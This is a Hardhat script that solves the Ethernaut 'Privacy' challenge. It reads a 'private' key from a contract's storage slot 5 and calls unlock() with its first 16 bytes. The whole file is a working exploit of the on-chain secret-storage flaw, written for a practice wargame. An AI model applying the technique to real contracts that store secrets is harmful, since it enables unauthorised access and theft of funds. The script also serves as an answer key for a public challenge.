const { ethers } = require("hardhat");
const Runner = require("./lib/runner");


Runner.run(async (provider) => { 
    
    //PLACE PRIVACY CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0xe2502bF3b2Cbb00C7A1Ce44A8efCa6D759f49f7E";
    
    //get contract 
    const contract = await ethers.getContractAt("Privacy", contractAddr);
    
    console.log("* * * ");
    console.log(`contract is locked?: ${await contract.locked()}`); 
    
    //get password from storage 
    const password = await provider.getStorageAt(contractAddr, 5);
    
    //attempt to unlock
    console.log(`unlocking with password ${password}`);
    await(contract.unlock(password.substring(0, 34)));
    
    //unlocked?
    console.log(`contract is locked?: ${await contract.locked()}`); 
    console.log("* * * ");
});
